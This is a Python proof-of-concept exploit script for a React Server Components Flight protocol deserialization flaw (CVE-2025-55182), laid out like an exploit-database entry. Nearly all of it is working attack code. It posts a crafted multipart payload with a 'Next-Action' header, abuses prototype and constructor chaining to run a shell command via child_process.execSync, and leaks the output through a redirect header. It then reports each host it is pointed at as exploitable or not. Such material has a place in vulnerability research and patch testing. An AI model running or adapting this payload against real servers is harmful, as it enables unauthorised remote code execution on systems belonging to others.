# Title: React Server Components Flight Protocol Deserialization RCE (CVE-2025-55182)
# Date : 2025-12-12
# Author: Dong Cong
#         
# Website: https://congdong007.github.io/
# 
# CVE : CVE-2025-55182

#!/usr/bin/python3

import requests
import argparse
import warnings

warnings.filterwarnings("ignore")

parser=argparse.ArgumentParser()
parser.add_argument("--host", help="input the vulnerable host", type=str)
args = parser.parse_args()

# http://xx.xx.xx.xx:3000
host = args.host
print(host)


headers = {
    "Next-Action": "x",
    # ⚠️ Content-Type 不要手动写 boundary，让 requests 自动生成
}

data_0 = r'''{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}'''

files = {
    "0": (None, data_0, "application/json"),
    "1": (None, '"$@0"', "application/json"),
    "2": (None, '[]', "application/json"),
}

response = requests.post(
    host,
    headers=headers,
    files=files
)

print("status:", response.status_code)
if response.status_code == 303:
    if 'groups='  in response.headers.get("x-action-redirect") or 'gid=' in response.headers.get("x-action-redirect") or 'gid=' in response.headers.get("x-action-redirect") :
        print(f"{host} exploitable!")
    else:
        print(f"{host} unexploitable!")